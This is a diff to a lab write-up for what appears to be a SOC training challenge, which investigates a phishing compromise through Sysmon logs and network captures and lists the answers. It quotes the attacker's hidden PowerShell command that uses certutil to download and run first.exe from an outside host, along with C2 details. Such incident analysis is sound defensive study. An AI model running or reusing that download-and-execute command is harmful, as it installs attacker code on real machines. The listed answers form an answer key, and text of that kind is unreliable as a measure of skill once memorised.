@@ -5,7 +5,11 @@
 This room is a capstone challenge for the SOC 1 learning path. 
 
 ### Task 3: Preparation - Tools and Artifacts
-This task asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`
+This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView
+
+<img width="1080" height="594" alt="image" src="https://github.com/user-attachments/assets/3b9ae910-d797-4b8f-9efb-5ca1fa8c3810" />
+
+The task also asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`
 
 <img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />
 
@@ -95,17 +99,67 @@ This is the path we found in the obfuscated string, we just had to replace $app 
 
 **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
 *Format: Remove the double quotes from the log.*
->
+> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+
+Filtering for processes with `C:\Windows\explorer.exe` as their ParentImage, the last entry with ParentUser TEMPEST\benimaru shows the command we are looking for.
+
+At this point I had only looked at the logs in Event Viewer, but I was running into 
 
 **Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
->
+> CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+
+In the previous step we found that first.exe was downloaded. We can filter for this and look for an entry with first.exe as the executable:
+
+<img width="379" height="162" alt="image" src="https://github.com/user-attachments/assets/ae734c7c-d640-4d17-ab05-da64c2d179b9" />
+
+With this we can see the hashes associated with this file:
+
+<img width="1012" height="159" alt="image" src="https://github.com/user-attachments/assets/004b59ce-c021-4bf8-bf9e-6b128f3790ec" />
 
 **The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**
 *Format: domain:port*
->
+> resolvecyber.xyz:80
+
+For this task I used SysmonView. Selecting first.exe makes it easy to see the network connections associated with the executable.
+
+<img width="469" height="765" alt="image" src="https://github.com/user-attachments/assets/f99ae9b2-dd23-46b4-9252-01d1203c94b8" />
 
 ### Task 6: Initial Access - Malicious Document Traffic
+We are now tasked with looking into the pcap file. We have the malicious domain and IP that we found in the last task.
+The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier
+
 #### Task 6 Questions:
+**What is the URL of the malicious payload embedded in the document?**
+> http://phishteam.xyz/02dcf07/index.html
+
+We have two malicious domains to look at: phishteam.xyz, and resolvecyber.xyz. We will look into both, but for this question we search for phishteam.xyz.
+
+<img width="860" height="357" alt="image" src="https://github.com/user-attachments/assets/df129d12-a3bc-48c1-a1da-afc0068c73d9" />
+
+**What is the encoding used by the attacker on the c2 connection?**
+> base64
+
+This time we will search for the domain that was used as a c2 server (resolvecyber.xyz).
+Many of the GET requests have a lot of encoded data in their queries, which seems to be in base64.
+
+<img width="1190" height="354" alt="image" src="https://github.com/user-attachments/assets/62a58132-f327-47ec-b587-4d165f4badd6" />
+
+The next 3 questions all have to do with what is shown in the last image
+**The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**
+> q
+
+**The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**
+> /9ab62b5
+
+**What is the HTTP method used by the binary?**
+> GET
+
+**Based on the user agent, what programming language was used by the attacker to compile the binary?**
+*Format: Answer in lowercase*
+> nim
+
+The user agent is: `Nim httpclient/1.6.6`
+
 ### Task 7: Discovery - Internal Reconnaissance
 #### Task 7 Questions:
 ### Task 8: Privilege Escalation - Exploiting Privileges
